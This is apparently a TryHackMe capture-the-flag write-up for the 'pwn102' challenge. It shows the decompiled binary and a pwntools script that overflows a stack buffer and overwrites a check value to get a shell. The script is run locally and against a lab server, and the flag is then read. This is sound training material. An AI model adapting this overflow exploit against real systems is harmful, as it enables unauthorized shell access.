# pwn102

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
└─$ file pwn102-1644307392479.pwn102
pwn102-1644307392479.pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2612b87a7803e0a8af101dc39d860554c652d165, not stripped
```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
└─$ checksec pwn102-1644307392479.pwn102
[*] '/mnt/c/Users/hzqzz/Downloads/pwn101/pwn102-1644307392479.pwn102'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[104]; // [rsp+0h] [rbp-70h] BYREF
  __int64 v5; // [rsp+68h] [rbp-8h]

  setup(argc, argv, envp);
  banner();
  v5 = 0xBADF00DFEE1DEADLL;
  printf("I need %x to %x\nAm I right? ", 195948557LL, 4276215469LL);
  __isoc99_scanf("%s", v4);
  if ( v5 != 0xC0FF330000C0D3LL )
  {
    puts("I'm feeling dead, coz you said I need bad food :(");
    exit(1337);
  }
  printf("Yes, I need %x to %x\n", 12648243LL, 49363LL);
  return system("/bin/sh");
}
```

Based on the source code, we need v5 = 0xC0FF330000C0D3LL to get `/bin/sh`

So need to overflow v4 then pass in0xC0FF330000C0D3LL. Here I used pwntools script edited from template command by pwntools.

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn102-1644307392479.pwn102'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 0x68

padding = b"A" * offset
check1  = p64(0xC0FF330000C0D3)

payload = padding + check1

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
└─$ python exploit.py
[+] Starting local process './pwn102-1644307392479.pwn102': pid 901
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls
exploit.py                       pwn102-1644307392479.pwn102.id1
payload                          pwn102-1644307392479.pwn102.id2
pwn102-1644307392479.pwn102      pwn102-1644307392479.pwn102.nam
pwn102-1644307392479.pwn102.id0  pwn102-1644307392479.pwn102.til
$
[*] Interrupted
[*] Stopped process './pwn102-1644307392479.pwn102' (pid 901)
```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
└─$ python exploit.py REMOTE 10.10.47.113 9002
[+] Opening connection to 10.10.47.113 on port 9002: Done
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
```
